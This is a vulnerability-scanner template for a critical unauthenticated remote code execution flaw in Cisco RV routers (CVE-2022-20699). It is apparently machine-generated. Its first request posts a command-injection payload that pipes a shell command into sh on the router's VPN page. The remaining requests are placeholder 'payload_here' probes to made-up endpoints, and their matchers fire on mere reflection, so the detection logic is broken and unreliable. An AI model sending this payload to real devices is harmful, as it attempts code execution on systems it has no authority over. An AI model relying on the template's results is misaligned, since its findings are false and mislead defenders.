id: CVE-2022-20699

info:
  name: Cisco RV Series Routers Unauthenticated RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: Unauthenticated remote code execution vulnerability in Cisco RV series routers SSL VPN functionality.
  impact: |
    Successful exploitation could allow an unauthenticated attacker to execute arbitrary code on the affected device.
  remediation: |
    Apply the necessary security patches provided by Cisco to mitigate the CVE-2022-20699 vulnerability.
  reference:
    - https://www.zerodayinitiative.com/advisories/ZDI-22-414/
    - https://github.com/CVEDB/top
    - https://github.com/Ostorlab/KEV
    - https://github.com/hktalent/TOP
    - https://github.com/jbmihoub/all-poc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-20699
    cwe-id: CWE-121,CWE-1284
    epss-score: 0.96007
    epss-percentile: 0.99551
    cpe: cpe:2.3:o:cisco:rv340_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: cisco
    product: rv340_firmware
    fofa-query: app="CISCO-RV340" || app="CISCO-RV340W" || app="CISCO-RV345" || app="CISCO-RV345P"
  tags: kev

http:
  - method: POST
    path:
      - "{{BaseURL}}/vpn/index.html"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      data=|echo$IFS"exploit"|sh
    matchers:
      - type: word
        words:
          - "exploit"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/exploit"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "exploit": "payload_here"
      }
    matchers:
      - type: word
        words:
          - "payload_here"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/vulnerable_endpoint"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "exploit": "RCE_payload_here"
      }
    matchers:
      - type: word
        words:
          - "RCE_payload_here"
        part: body
